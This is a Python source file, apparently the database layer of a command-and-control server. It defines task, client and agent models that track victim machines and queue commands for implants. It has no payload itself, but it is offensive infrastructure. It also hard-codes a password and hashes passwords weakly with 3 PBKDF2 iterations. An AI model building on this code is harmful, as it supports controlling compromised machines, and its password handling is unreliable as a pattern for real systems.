"""
    This file stores all the functions that are used to interact with the database from the server
"""

import os
from c2_config import *

### some useful notes here ###
"""
sqlite:///:memory: (in-memory database)
sqlite:///relative_path/test.db (relatie path file-based database)
sqlite:////absolute_path/test.db (abs path file-based database)
"""
# -----------------------------

### configs ###
# APP_KEY = os.environ["APP_KEY"]
password = "ch0nky" # a temperary password to test the server
localhost = "http://127.0.0.1:5000"
template_dir = "../client/templates"
app_secret_key = os.urandom(24)
# -----------------------------

# 3 statuses for a task
CREATED = "CREATED"
TASKED = 'TASKED'
DONE = "DONE"

class Task(db.Model): # a SQLAlchemy class
    id = db.Column(db.Integer, primary_key=True) ## a database entity that allows us to index the entries
    # need to specify length of String if using MySQL; Feel free to change the length
    job_id = db.Column(db.String(288))
    agent_id = db.Column(db.String(288)) ## the agent that is associated with the task
    command_type = db.Column(db.String(288))
    cmd = db.Column(db.String(4096))
    job_status = db.Column(db.String(288))
    job_results = db.Column(db.String(4096))

class Client(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(288))
    salt = db.Column(db.LargeBinary(128))
    password = db.Column(db.String(288))
    

class Agent(db.Model, UserMixin): 
    id               = db.Column(db.Integer, primary_key = True)
    agent_id         = db.Column(db.String(288))
    # salt             = db.Column(db.LargeBinary(128))
    # password         = db.Column(db.String(288)) # no longer used
    computer_name    = db.Column(db.String(288)) # what computer did it connect from
    username         = db.Column(db.String(80)) # what user are you running as
    cpus             = db.Column(db.String(288))
    osVersion        = db.Column(db.String(288))
    adaptors         = db.Column(db.String(288))
    # GUID             = db.Column(db.String(288)) # computer's GUID
    # Integrity        = db.Column(db.String(288)) # what privileges do you have
    # ip_address       = db.Column(db.String(32))  # what address did the implant connect from
    # session_key      = db.Column(db.String(288)) # after you negotiated a session key, store it per agent
    # sleep            = db.Column(db.Float)       # how often does the agent check in 
    # jitter           = db.Column(db.Float)       # how random of a check in is it
    # first_seen       = db.Column(db.DateTime)    # when did the agent first check in
    # last_seen        = db.Column(db.DateTime)    # when was the last time you saw the agent
    # expected_checkin = db.Column(db.DateTime)    # when should you expect to see the agent again

# search agent by agent_id
# link for ref: https://flask-sqlalchemy.palletsprojects.com/en/2.x/queries/
def find_agent_by_id(id_):
    """
        a function that finds an agent in database by its id
    """
    return Agent.query.filter_by(agent_id=id_).first()

def agent_exist(id_):
    """
        a function that checks if an agent exists
    """
    return find_agent_by_id(id_) != None

def find_client_by_id(id_):
    """
        a function that finds a client in database by its id
    """
    return Client.query.filter_by(client_id=id_).first()

def client_exist(id_):
    """
        a function that checks if a client exists
    """
    return find_client_by_id(id_) != None

def find_agent_task(agent_id):
    """
        a function that finds a task for an agent
    """
    return Task.query.filter_by(agent_id=agent_id, job_status=CREATED).first()

def find_task_by_jobID(job_id):
    """
        a function that finds a task by its job_id
    """
    return Task.query.filter_by(job_id=job_id).first()

def hash_password(password):
    """
        given a password as a string, return the hashed version
    """
    password = password.encode('utf-8')
    salt = os.urandom(32)
    digest = hashlib.pbkdf2_hmac('sha256', password, salt, 3)
    return digest.hex(), salt

def decrypt_password(password, salt):
    """
    given a password and a salt, reproduce the hash stroe in database
    """
    password = password.encode('utf-8')
    digest = hashlib.pbkdf2_hmac('sha256', password, salt, 3)
    return digest.hex()

def verify_agent_password(reg_password):
    """
        a function that verifies the password by comparing
        the hash stored in the database with the hash generated
    """
    reg_password = hashlib.sha256(reg_password.encode('utf-8')).hexdigest()
    return reg_password == agent_password

def verify_client_password(reg_client_id, reg_password):
    """
        a function that verifies the password by comparing
        the hash stored in the database with the hash generated
    """
    if not client_exist(reg_client_id):
        return False
    client = find_client_by_id(reg_client_id)
    hex_password = decrypt_password(reg_password, client.salt)
    return client.password == hex_password

def list_agents():
    """
        a function that returns a list of agents stored in database
    """
    agents = Agent.query.all()
    agent_ids = [{"victim_machine_user": i.computer_name, "agent_id": i.agent_id} for i in agents]
    return agent_ids

def list_clients():
    """
        a function that returns a list of clients stored in database
    """
    clients = Client.query.all()
    client_ids = [i.client_id for i in clients]
    return client_ids

#TODO: list tasks by agent
def list_tasks(target_agent_id):
    """
        a function that returns a list of tasks stored in database
    """
    return Task.query.filter_by(agent_id=target_agent_id)
    # # tasks = Task.query.all()
    # t = [{"agent_id":i.agent_id, "job_id": i.job_id, "job_status": i.job_status, 
    #         "command_type": i.command_type, "cmd": i.cmd, "job_results": i.job_results } for i in tasks]
    # return t

def list_tasks_CREATED(agent_id):
    """
        a function that returns a list of tasks stored in database
    """
    return Task.query.filter_by(agent_id=agent_id, job_status=CREATED)

